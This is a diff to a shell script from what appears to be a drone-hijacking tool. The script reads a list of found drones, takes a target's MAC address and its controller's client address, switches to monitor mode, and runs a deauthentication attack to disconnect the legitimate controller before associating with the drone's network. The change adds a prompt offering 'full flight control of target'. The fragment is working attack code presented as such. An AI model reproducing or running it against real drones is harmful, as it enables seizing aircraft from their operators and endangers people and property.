@@ -32,13 +32,17 @@ else
 	TARGET_MAC=`grep -n bssid .dronesFound.txt | grep "$LINE:" | cut -d ":" -f 3,4,5,6,7,8 | sed -e 's/^[[:space:]]*//'`
 	LINE=$((`expr $TARGET_NUM \* 4`))
 	CLIENT=`grep -n client .dronesFound.txt | grep "$LINE:" | cut -d ":" -f 3,4,5,6,7,8 | sed -e 's/^[[:space:]]*//'`
-
-	echo -e "Deauthentication current drone controller: ${RED}$CLIENT${NO_COLOR}"
-	./channelMonitorMode.sh $CHANNEL
-	MON_INT=`cat .ints.txt | cut -d " " -f 2 `
-	./deauth.sh $MON_INT $TARGET_MAC $CLIENT >> /dev/null &
-	RPID=$!
-	echo "RPID: $RPID"
+	
+	read -p "Would you like full flight control of target (y/n): " FLIGHT
+	if [ "$FLIGHT" == "y" ]
+	then
+		echo -e "Deauthentication current drone controller: ${RED}$CLIENT${NO_COLOR}"
+		./channelMonitorMode.sh $CHANNEL
+		MON_INT=`cat .ints.txt | cut -d " " -f 2 `
+		./deauth.sh $MON_INT $TARGET_MAC $CLIENT >> /dev/null &
+		RPID=$!
+		echo "RPID: $RPID"
+	fi
 
 	echo -e "Associating with ${GREEN}$TARGET_ESSID${NO_COLOR} over ${YELLOW}$INT${NO_COLOR}"
 
